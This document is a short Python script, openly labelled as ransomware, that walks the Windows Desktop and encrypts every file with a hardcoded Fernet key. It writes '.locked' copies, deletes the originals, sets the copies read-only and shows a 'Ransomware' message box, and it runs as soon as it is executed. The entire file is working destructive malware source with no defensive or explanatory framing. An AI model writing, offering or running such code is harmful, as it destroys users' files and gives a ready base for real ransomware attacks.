import os
from cryptography.fernet import Fernet
import ctypes  # For showing a message box

# Hardcoded encryption key
KEY = b's8tdnp2xv_rhK39GAStQsp_sKS534UcfUmeZa0IKhTQ='  # Use the generated key
cipher_suite = Fernet(KEY)  # Use the same key for encryption

# Function to encrypt files
def lock_files():
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            # Skip the lock and unlock scripts to avoid locking them
            if file == "lock_files.py" or file == "unlock_files.py":
                print(f"[!] Skipping file: {file}")
                continue

            file_path = os.path.join(root, file)
            locked_path = file_path + ".locked"

            try:
                # Read the file content
                with open(file_path, "rb") as f:
                    file_data = f.read()

                # Encrypt the file content
                encrypted_data = cipher_suite.encrypt(file_data)

                # Write the encrypted data to a new file
                with open(locked_path, "wb") as f:
                    f.write(encrypted_data)

                # Delete the original file
                os.remove(file_path)
                os.chmod(locked_path, 0o444)  # Read-only permissions
                print(f"[+] Locked file: {file_path}")

            except Exception as e:
                print(f"[-] Failed to lock {file_path}: {e}")

    # Show a message box
    ctypes.windll.user32.MessageBoxW(0, "All files on your Desktop have been locked!", "Ransomware", 1)

# Automatically lock files on execution
if __name__ == "__main__":
    lock_files()